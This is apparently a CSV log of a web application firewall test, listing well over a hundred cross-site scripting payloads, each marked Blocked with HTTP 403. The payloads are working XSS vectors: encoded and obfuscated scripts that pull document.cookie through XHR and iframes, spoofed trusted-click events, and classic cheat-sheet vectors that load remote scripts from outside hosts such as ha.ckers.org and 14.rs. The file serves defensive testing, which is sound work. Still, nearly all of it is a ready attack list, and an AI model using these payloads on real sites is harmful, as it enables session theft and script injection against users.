Status,Payload,HTTP Status,Content Length
Blocked,"<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>",403,3662
Blocked,<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,403,3662
Blocked,"<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>",403,3662
Blocked,<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,403,3662
Blocked,<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>,403,3662
Blocked,<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>,403,3662
Blocked,"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>",403,3662
Blocked,"<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>",403,3662
Blocked,"<script>alert(document.head.innerHTML.substr(146,20));</script>",403,3662
Blocked,<script>alert(document.head.childNodes[3].text)</script>,403,3662
Blocked,"<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>",403,3662
Blocked,"<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>",403,3662
Blocked,"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>",403,3662
Blocked,"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>",403,3662
Blocked,"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>",403,3662
Blocked,"<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>",403,3662
Blocked,<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>,403,3662
Blocked,"<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>",403,3662
Blocked,"<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>",403,3662
Blocked,"<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script> ",403,3662
Blocked,<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #,403,3662
Blocked,"<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> # ",403,3662
Blocked,<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#,403,3662
Blocked,"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#",403,3662
Blocked,<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23,403,3662
Blocked,<script for=document event=onreadystatechange>getElementById('safe123').click()</script>,403,3662
Blocked,<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,403,3662
Blocked,"<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>",403,3662
Blocked,"<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",403,3662
Blocked,"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",403,3662
Blocked,"<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",403,3662
Blocked,"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",403,3662
Blocked,"<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#",403,3662
Blocked,"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
Blocked,<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,403,3662
Blocked,<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>,403,3662
Blocked,"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
Blocked,<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,403,3662
Blocked,"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
Blocked,<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>,403,3662
Blocked,"<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>",403,3662
Blocked,"<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
Blocked,"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E",403,3662
Blocked,"<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>",403,3662
Blocked,"<a target=""x"" href=""xssme?xss=%3Cscript%3EaddEventListener%28%22DOMFrameContentLoaded%22,%20function%28e%29%20{e.stopPropagation%28%29;},%20true%29;%3C/script%3E%3Ciframe%20src=%22data:text/html,%253cscript%253eObject.defineProperty%28top,%20%27MyEvent%27,%20{value:%20Object,%20configurable:%20true}%29;function%20y%28%29%20{alert%28top.Safe.get%28%29%29;};event%20=%20new%20Object%28%29;event.type%20=%20%27click%27;event.isTrusted%20=%20true;y%28event%29;%253c/script%253e%22%3E%3C/iframe%3E",403,3662
Blocked,"<a target=""x"" href=""xssme?xss=<script>var cl=Components;var fcc=String.fromCharCode;doc=cl.lookupMethod(top, fcc(100,111,99,117,109,101,110,116) )( );cl.lookupMethod(doc,fcc(119,114,105,116,101))(doc.location.hash)</script>#<iframe src=data:text/html;base64,PHNjcmlwdD5ldmFsKGF0b2IobmFtZSkpPC9zY3JpcHQ%2b name=ZG9jPUNvbXBvbmVudHMubG9va3VwTWV0aG9kKHRvcC50b3AsJ2RvY3VtZW50JykoKTt2YXIgZmlyZU9uVGhpcyA9ICBkb2MuZ2V0RWxlbWVudEJ5SWQoJ3NhZmUxMjMnKTt2YXIgZXZPYmogPSBkb2N1bWVudC5jcmVhdGVFdmVudCgnTW91c2VFdmVudHMnKTtldk9iai5pbml0TW91c2VFdmVudCggJ2NsaWNrJywgdHJ1ZSwgdHJ1ZSwgd2luZG93LCAxLCAxMiwgMzQ1LCA3LCAyMjAsIGZhbHNlLCBmYWxzZSwgdHJ1ZSwgZmFsc2UsIDAsIG51bGwgKTtldk9iai5fX2RlZmluZUdldHRlcl9fKCdpc1RydXN0ZWQnLGZ1bmN0aW9uKCl7cmV0dXJuIHRydWV9KTtmdW5jdGlvbiB4eChjKXtyZXR1cm4gdG9wLlNhZmUuZ2V0KCl9O2FsZXJ0KHh4KGV2T2JqKSk></iframe>",403,3662
Blocked,"<a target=""x"" href=""xssme?xss=<script>find('cookie'); var doc = getSelection().getRangeAt(0).startContainer.ownerDocument; console.log(doc); var xpe = new XPathEvaluator(); var nsResolver = xpe.createNSResolver(doc); var result = xpe.evaluate('//script/text()', doc, nsResolver, 0, null); alert(result.iterateNext().data.match(/cookie = '(.*?)'/)[1])</script>",403,3662
Blocked,"<a target=""x"" href=""xssme?xss=<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe src=%22javascript:parent.x(window);%22></iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', '.', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",403,3662
Blocked,"Garethy Salty Method!<script>alert(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(Components.lookupMethod(this,'window')(),'document')(), 'getElementsByTagName')('html')[0],'innerHTML')().match(/d.*'/));</script>",403,3662
Blocked,<div onmouseover='alert&lpar;1&rpar;'>DIV</div>,403,3662
Blocked,"<iframe style=""position:absolute;top:0;left:0;width:100%;height:100%"" onmouseover=""prompt(1)"">",403,3662
Blocked,"<embed src=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf""> ?",403,3662
Blocked,"<object data=""http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"">?",403,3662
Blocked,"<var onmouseover=""prompt(1)"">On Mouse Over</var>?",403,3662
Blocked,"<img src=""/"" =_="" title=""onerror='prompt(1)'"">",403,3662
Blocked,"<script src=""data:text/javascript,alert(1)""></script>",403,3662
Blocked,<iframe/src \/\/onload = prompt(1),403,3662
Blocked,<iframe/onreadystatechange=alert(1),403,3662
Blocked,<svg/onload=alert(1),403,3662
Blocked,<input value=<><iframe/src=javascript:confirm(1),403,3662
Blocked,"<input type=""text"" value=``<div/onmouseover='alert(1)'>X</div>",403,3662
Blocked,http://www.<script>alert(1)</script .com,403,3662
Blocked,<svg><script ?>alert(1),403,3662
Blocked,<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>,403,3662
Blocked,<img src=`xx:xx`onerror=alert(1)>,403,3662
Blocked,"<object type=""text/x-scriptlet"" data=""http://jsfiddle.net/XLE63/ ""></object>",403,3662
Blocked,"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>?",403,3662
Blocked,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",403,3662
Blocked,"<embed code=""http://businessinfo.co.uk/labs/xss/xss.swf"" allowscriptaccess=always>?",403,3662
Blocked,"<a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a",403,3662
Blocked,<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,403,3662
Blocked,<script>~'\u0061' ;  \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073.  \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,403,3662
Blocked,"<script/src=""data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')""></script a=\u0061 & /=%2F",403,3662
Blocked,"<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script ????????????",403,3662
Blocked,<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>,403,3662
Blocked,<script>+-+-1-+-+alert(1)</script>,403,3662
Blocked,<body/onload=&lt;!--&gt;&#10alert(1)>,403,3662
Blocked,<script itworksinallbrowsers>/*<script* */alert(1)</script ?,403,3662
Blocked,<img src ?itworksonchrome?\/onerror = alert(1)???,403,3662
Blocked,<svg><script>//&NewLine;confirm(1);</script </svg>,403,3662
Blocked,<svg><script onlypossibleinopera:-)> alert(1),403,3662
Blocked,<script x> alert(1) </script 1=2,403,3662
Blocked,"<div/onmouseover='alert(1)'> style=""x:"">",403,3662
Blocked,<--`<img/src=` onerror=alert(1)> --!>,403,3662
Blocked,"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script> ?",403,3662
Blocked,"<div  style=""position:absolute;top:0;left:0;width:100%;height:100%""  onmouseover=""prompt(1)"" onclick=""alert(1)"">x</button>?",403,3662
Blocked,"""><img src=x onerror=window.open('https://www.google.com/');>",403,3662
Blocked,<form><button formaction=javascript&colon;alert(1)>CLICKME,403,3662
Blocked,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",403,3662
Blocked,"<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>?",403,3662
Blocked,"<iframe  src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",403,3662
Blocked,"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",403,3662
Blocked,"""><img src=x onerror=prompt(1);>",403,3662
Blocked,<SCRIPT>alert('XSS');</SCRIPT>,403,3662
Blocked,<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,403,3662
Blocked,"<IMG SRC=""javascript:alert('XSS');"">",403,3662
Blocked,<IMG SRC=javascript:alert('XSS')>,403,3662
Blocked,<IMG SRC=JaVaScRiPt:alert('XSS')>,403,3662
Blocked,<IMG SRC=javascript:alert(&quot;XSS&quot;)>,403,3662
Blocked,"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",403,3662
Blocked,"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",403,3662
Blocked,"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,403,3662
Blocked,"<IMG SRC=""javascript:alert('XSS')""",403,3662
Blocked,<SCRIPT>a=/XSS/,403,3662
Blocked,"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",403,3662
Blocked,"<BODY BACKGROUND=""javascript:alert('XSS')"">",403,3662
Blocked,<BODY ONLOAD=alert('XSS')>,403,3662
Blocked,"<IMG DYNSRC=""javascript:alert('XSS')"">",403,3662
Blocked,"<IMG LOWSRC=""javascript:alert('XSS')"">",403,3662
Blocked,"<BGSOUND SRC=""javascript:alert('XSS');"">",403,3662
Blocked,"<LAYER SRC=""http://ha.ckers.org/scriptlet.html""></LAYER>",403,3662
Blocked,"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",403,3662
Blocked,"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",403,3662
Blocked,<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,403,3662
Blocked,"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",403,3662
Blocked,"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",403,3662
Blocked,"<IMG SRC='vbscript:msgbox(""XSS"")'>",403,3662
Blocked,"<IMG SRC=""mocha:[code]"">",403,3662
Blocked,"<IMG SRC=""livescript:[code]"">",403,3662
Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:alert('XSS');"">",403,3662
Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"">",403,3662
Blocked,"<META HTTP-EQUIV=""Link"" Content=""<javascript:alert('XSS')>; REL=stylesheet"">",403,3662
Blocked,"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:alert('XSS');"">",403,3662
Blocked,"<IFRAME SRC=""javascript:alert('XSS');""></IFRAME>",403,3662
Blocked,"<FRAMESET><FRAME SRC=""javascript:alert('XSS');""></FRAMESET>",403,3662
Blocked,"<TABLE BACKGROUND=""javascript:alert('XSS')"">",403,3662
Blocked,"<DIV STYLE=""background-image: url(javascript:alert('XSS'))"">",403,3662
Blocked,"<DIV STYLE=""width: expression(alert('XSS'));"">",403,3662
Blocked,"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",403,3662
Blocked,"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",403,3662
Blocked,"<XSS STYLE=""xss:expression(alert('XSS'))"">",403,3662
Blocked,"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",403,3662
Blocked,"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",403,3662
Blocked,"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",403,3662
Blocked,"<BASE HREF=""javascript:alert('XSS');//"">",403,3662
Blocked,"<OBJECT TYPE=""text/x-scriptlet"" DATA=""http://ha.ckers.org/scriptlet.html""></OBJECT>",403,3662
Blocked,<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>,403,3662
Blocked,"getURL(""javascript:alert('XSS')"")",403,3662
Blocked,"<XML SRC=""http://ha.ckers.org/xsstest.xml"" ID=I></XML>",403,3662
Blocked,<HTML><BODY>,403,3662
Blocked,"<SCRIPT SRC=""http://ha.ckers.org/xss.jpg""></SCRIPT>",403,3662
Blocked,"<META HTTP-EQUIV=""Set-Cookie"" Content=""USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;"">",403,3662
Blocked,"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",403,3662
Blocked,"<SCRIPT a="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT a="">"" '' SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT ""a='>'"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT a=`>` SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",403,3662
Blocked,<svg%0Aonload=%09((pro\u006dpt))()//,403,3662
Blocked,<sCriPt x>(((confirm)))``</scRipt x>,403,3662
Blocked,"<w=""/x=""y>""/OndbLcLick=`<`[confir\u006d``]>z",403,3662
Blocked,<deTAiLs/open/oNtoGGle=confirm()>,403,3662
Blocked,"<scRiPt y=""><"">/*<sCRipt* */prompt()</script",403,3662
Blocked,"<A href=""javascript%26colon;confirm()"">click",403,3662
Blocked,<sVg oNloaD=write()>,403,3662
Blocked,"<sCrIpt/""<a""/srC=data:="".<a,[8].some(confirm)>",403,3662
Blocked,"<svG/x="">""/oNloaD=confirm()//",403,3662
Blocked,<--`<iMG/srC=` onerror=confirm``> --!>,403,3662
Blocked,"<SVg </onlOad =""1> (_=prompt,_(1)) """">",403,3662
Blocked,<!--><scRipT src=//14.rs>,403,3662
Blocked,<sCriPt/src=//14.rs?,403,3662
Blocked,"<sCRIpt x="">"" src=//15.rs></script>",403,3662
Blocked,<D3/OnMouSEenTer=[2].find(confirm)>z,403,3662
Blocked,"<D3""<""/OncLick=""1>[confirm``]""<"">z",403,3662
Blocked,<D3/OnpOinTeReENter=confirm``>click here,403,3662
Blocked,"<!'/*""/*/'/*/""/*--></Script><Image SrcSet=K */; OnError=confirm`1` //>",403,3662
Blocked,<Z oncut=alert()>x,403,3662
Blocked,<iFrAMe/src \/\/onload = prompt(1),403,3662
Blocked,"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",403,3662
